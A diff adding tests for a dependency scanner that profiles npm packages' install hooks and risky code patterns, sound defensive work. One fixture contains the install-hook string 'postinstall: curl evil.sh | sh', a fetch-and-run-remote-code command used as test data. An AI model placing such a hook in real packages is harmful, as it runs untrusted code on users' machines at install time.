@@ -12,6 +12,7 @@ from pathlib import Path
 import pytest
 
 from backend.deps import scanner
+from backend.models.dependencies import CapabilityProfile
 from backend.models.enums import CapabilityCategory, PathClass, SourceKind
 
 
@@ -110,6 +111,109 @@ async def test_scan_source_includes_flagged_install_hook():
 
     assert any("postinstall" in h for h in profile.install_hooks)
     assert not any("prepare" in h for h in profile.install_hooks)  # husky install is benign
+
+
+@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
+@pytest.mark.asyncio
+async def test_scan_source_flags_install_time_evidence():
+    """`scripts/setup.js` is run directly by the flagged postinstall hook —
+    its evidence must carry install_time=True. index.js's evidence, which
+    only runs when required, must not."""
+    profile = await scanner.scan_source(
+        FIXTURE_DIR, SourceKind.NPM_TARBALL, name="mini-package", version="1.0.0"
+    )
+
+    setup_evidence = [
+        e for e in profile.evidence if e.file.replace("\\", "/") == "scripts/setup.js"
+    ]
+    assert setup_evidence, "expected evidence from scripts/setup.js"
+    assert all(e.install_time for e in setup_evidence)
+    assert any(e.category == CapabilityCategory.ENVIRONMENT for e in setup_evidence)
+
+    index_evidence = [e for e in profile.evidence if e.file.replace("\\", "/") == "index.js"]
+    assert index_evidence
+    assert not any(e.install_time for e in index_evidence)
+
+
+def test_category_set_includes_build_install_from_flagged_hook():
+    """A flagged install hook is a capability even with zero Semgrep evidence
+    for it — `build_install.yaml` was deleted (its one rule, non-literal
+    require, moved to dynamic_code.yaml), so nothing else produces this
+    category anymore."""
+    profile = CapabilityProfile(
+        name="pkg",
+        version="1.0.0",
+        source_kind=SourceKind.NPM_TARBALL,
+        install_hooks=["postinstall: curl evil.sh | sh — ..."],
+        status="ok",
+    )
+
+    assert CapabilityCategory.BUILD_INSTALL in profile.category_set()
+
+
+def test_category_set_no_build_install_without_hooks():
+    profile = CapabilityProfile(
+        name="pkg", version="1.0.0", source_kind=SourceKind.NPM_TARBALL, status="ok"
+    )
+
+    assert CapabilityCategory.BUILD_INSTALL not in profile.category_set()
+
+
+@pytest.mark.parametrize(
+    ("start", "end", "expected_substring"),
+    [
+        ({"line": 1, "col": 1}, {"line": 1, "col": 5}, "eval"),
+        ({"line": 2, "col": 1}, {"line": 2, "col": 4}, "fs"),
+    ],
+)
+def test_extract_snippet_reads_real_line(start, end, expected_substring):
+    lines = ["eval(x);", "fs.readFileSync(y);"]
+    snippet = scanner._extract_snippet(lines, start, end)
+    assert expected_substring in snippet
+
+
+def test_extract_snippet_windows_minified_line():
+    """A match deep inside a long single-line bundle must not just return the
+    start of the line — the window must be centered on the match's columns."""
+    prefix = "a" * 5000
+    match = "eval(userInput)"
+    suffix = "b" * 5000
+    line = prefix + match + suffix
+    match_start_col = len(prefix) + 1
+    match_end_col = match_start_col + len(match)
+
+    snippet = scanner._extract_snippet(
+        [line], {"line": 1, "col": match_start_col}, {"line": 1, "col": match_end_col}
+    )
+
+    assert match in snippet
+    assert len(snippet) <= scanner._SNIPPET_MAX_LEN + 6  # + "..." on both ends
+    assert not snippet.startswith("a" * 100)
+
+
+def test_extract_snippet_out_of_range_line_returns_empty():
+    assert scanner._extract_snippet(["only line"], {"line": 5}, {"line": 5}) == ""
+
+
+@pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
+@pytest.mark.asyncio
+async def test_view_loader_nonliteral_require_is_dynamic_code_not_build_install(tmp_path):
+    """Regression for the build_install.yaml -> dynamic_code.yaml move: a
+    non-literal require() (the express view-engine-loader shape) must be
+    categorized dynamic_code. There is no build_install rule left to
+    misfire — this pins the category, not just the absence of a rule."""
+    (tmp_path / "package.json").write_text('{"name": "view-pkg", "version": "1.0.0"}')
+    (tmp_path / "index.js").write_text(
+        "function loadView(engine) {\n  return require(engine);\n}\nmodule.exports = loadView;\n"
+    )
+
+    profile = await scanner.scan_source(
+        tmp_path, SourceKind.NPM_TARBALL, name="view-pkg", version="1.0.0"
+    )
+
+    assert profile.status == "ok"
+    assert CapabilityCategory.DYNAMIC_CODE in profile.category_set()
+    assert CapabilityCategory.BUILD_INSTALL not in profile.category_set()
 
 
 @pytest.mark.skipif(_semgrep_missing, reason="semgrep binary not installed")
